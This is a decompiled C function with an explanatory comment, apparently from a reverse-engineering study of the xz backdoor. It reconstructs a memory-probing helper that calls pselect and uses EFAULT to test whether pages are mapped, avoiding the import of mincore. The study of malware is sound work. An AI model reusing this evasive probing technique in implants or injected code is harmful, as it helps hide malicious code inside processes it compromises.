// /home/kali/xzre-ghidra/xzregh/102370_is_range_mapped.c
// Function: is_range_mapped @ 0x102370
// Calling convention: __stdcall
// Prototype: BOOL __stdcall is_range_mapped(u8 * addr, u64 length, global_context_t * ctx)


/*
 * AutoDoc: Userland page-probe that avoids importing `mincore(2)`. The helper aligns the requested address downward, then walks one page at
 * a time toward `addr + length`, invoking the host's `pselect` with NULL fd sets and the page pointer passed in as the signal mask
 * argument. If `pselect` faults with EFAULT the page is unmapped, otherwise the loop continues until every page succeeds. The
 * routine relies on `ctx->libc_imports` to surface both `pselect` and `__errno_location`, and it refuses to touch addresses below
 * 0x01000000 to avoid probing NULL or vsyscall.
 */

#include "xzre_types.h"

BOOL is_range_mapped(u8 *addr,u64 length,global_context_t *ctx)

{
  libc_imports_t *imports;
  BOOL range_is_mapped;
  int pselect_result;
  int *errno_ptr;
  sigset_t *page_cursor;
  long timeout_sec;
  long timeout_nsec;
  
  if (length == 0) {
    return FALSE;
  }
  if (addr < (u8 *)0x1000000) {
LAB_00102393:
    range_is_mapped = FALSE;
  }
  else {
    page_cursor = (sigset_t *)((ulong)addr & 0xfffffffffffff000);
    if (page_cursor < addr + length) {
      if (ctx == (global_context_t *)0x0) goto LAB_00102393;
      do {
        timeout_sec = 0;
        imports = ctx->libc_imports;
        if (((imports == (libc_imports_t *)0x0) ||
            (imports->__errno_location == (pfn___errno_location_t)0x0)) ||
           (imports->pselect == (pfn_pselect_t)0x0)) goto LAB_00102393;
        timeout_nsec = 1;
        pselect_result = (*imports->pselect)(1,(fd_set *)0x0,(fd_set *)0x0,(fd_set *)0x0,(timespec *)&timeout_sec
                                   ,page_cursor);
        if ((pselect_result < 0) &&
           ((errno_ptr = (*ctx->libc_imports->__errno_location)(), *errno_ptr == 0xe ||
            (page_cursor == (sigset_t *)0x0)))) {
          *errno_ptr = 0;
          goto LAB_00102393;
        }
        page_cursor = page_cursor + 0x200;
      } while (page_cursor < addr + length);
    }
    range_is_mapped = TRUE;
  }
  return range_is_mapped;
}

